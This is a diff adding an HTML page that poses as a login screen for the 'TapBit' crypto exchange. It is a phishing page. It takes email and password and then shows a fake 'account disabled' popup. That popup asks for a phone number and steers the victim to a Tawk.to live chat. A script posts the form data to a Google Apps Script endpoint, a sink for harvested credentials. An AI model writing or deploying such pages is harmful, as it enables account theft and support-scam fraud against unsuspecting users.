@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="stylesheet" href="styles.css">
+  <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/64c626eccc26a871b02c21b9/1h6j0g3e9';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+
+</head>
+
+<body>
+
+  <header class="headerimg">
+    <img class = "headerimg" src="head.png" height="70px">
+  </header>
+
+  <script>
+    function return1()
+    {
+    window.location.href = 'error.html';
+    return false;
+    }
+    </script>
+
+
+  <div class="login-container">
+    <div class="login-form">
+      <div class="inline">
+        <h2>Login in</h2><h2 class="blue">TapBit</h2>
+        </div>
+        <form method="POST" action="">
+            <div class="form-group">
+                <label for="name">Email:</label>
+                <input type="name" placeholder="Email" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="pass">Password:</label>
+                <input type="pass" placeholder="Password" id="pass" name="pass" required>
+            </div>
+            
+
+      
+
+        <button id="showPopupBtn" class="whitebit-button">Login</button>
+
+  <div id="errorPopup" class="popup-box">
+    <h2 class="error-heading">Your account has been disabled for security reasons</h2>
+    <p class="error-message">Due to a recent activity, your account has been blocked. Please contact our support team on chat to verify and unlock your account.</p>
+    <div class="form-group">
+             
+      <input type="tel" placeholder="Enter Your Phone Number" id="phone" name="phone" required>
+  </div>
+    <button id="closePopupBtn" type="submit" class="whitebit-button">Chat With Us!</button>
+  </form>
+  </div>
+
+
+  <script src="app.js"></script>
+
+    </div>
+
+
+
+    <script>
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbxhByLuT46ljeNmewYkaFIpPd3hGxfWVqc63sReDbbr5yO3wTcBh-184GxhhMVvs9Wc/exec'
+      const form = document.forms['google-sheet1']
+    
+      form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => alert("Thanks for Logging In.."))
+          .catch(error => console.error('Error!', error.message))
+      })
+    </script>
+
+
+
+    <div class="qr-code">
+        <!-- Add your QR code image or content here -->>
+      <img src="qr.png">
+    </div>
+</div>
+
+  <script src="app.js"></script>
+</body>
+
+</html>
